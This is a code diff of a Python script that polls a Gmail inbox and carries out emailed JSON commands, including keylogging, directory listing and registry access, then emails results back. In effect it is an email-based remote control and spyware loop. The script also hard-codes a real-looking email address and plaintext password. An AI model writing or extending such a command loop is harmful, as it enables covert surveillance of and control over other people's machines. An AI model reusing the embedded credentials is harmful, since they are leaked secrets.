@@ -1,23 +1,21 @@
+import time
+import json
+
+from sympy import re
 from EmailTemplate import EmailTemplate 
 from Controls.RegistryControl import RegistryControl 
+from Controls.KeyloggerControl import KeyloggerControl
+from Controls.FileControl import FileControl
 
-if __name__ == "__main__":
-    gmail = EmailTemplate("theanh@canhcam.com", "Theanh!23")
-
-    while(1):
-        request = gmail.Receive()
-
-        response = HandleRequest(request)
-
-        # if(response):
-
-
-def HandleRequest(self, request):
+def HandleRequest(request, emailTemplate):
+    emailFrom = request["From"]
     try:
         if not request:
-            return null
+            return
 
-        method = request.body.method
+        body = json.loads(request["Body"])
+        method = body["Method"]
+        emailFrom = request["From"]
 
         if( method != "KEYLOG"
             and method != "SD_LO"
@@ -27,19 +25,41 @@ def HandleRequest(self, request):
             and method != "DIRECTORY"
             and method != "REGISTRY"
             and method != "QUIT"):
-            return 
-            {
+
+            response = {
                 "isSuccess": False,
                 "message": "No method found with the " + method 
             }
-
-        data = request.body.data
-
+            emailTemplate.SendNotification(emailFrom = emailTemplate.username , emailTo = emailFrom, subject = "[No-reply] Server Response", body = json.dumps(response))
+            return 
+            
+        if(method == "KEYLOG"):
+            controller = KeyloggerControl()
+            return controller.KeyloggerHandle(emailTemplate, emailFrom)
+        if(method == "DIRECTORY"):
+            directory = FileControl(emailTemplate, request.From)
+            return directory.FileHandle(emailTemplate)
         if(method == "REGISTRY"):
-            return RegistryControl.RegistryHandle(data)
+            controller = RegistryControl()
+            return controller.RegistryHandle(request, emailTemplate)
     except:
+        response = {
+                "isSuccess": False,
+                "message": "Failed to process from the server. Please try one more time."
+            }
+        emailTemplate.SendNotification(emailFrom = emailTemplate.username , emailTo = emailFrom, subject = "[No-reply] Server Response", body = json.dumps(response))
         return 
-        {
-            "isSuccess": False,
-            "message": "Failed to process from the server. Please try one more time."
-        }
+
+
+if __name__ == "__main__":
+    gmail = EmailTemplate("theanh@canhcam.com", "Theanh!23")
+
+    while(1):
+        content = gmail.Receive()
+        if not content: 
+            continue
+        data = json.loads(content)
+        response = HandleRequest(data, gmail)
+        time.sleep(5)
+
+
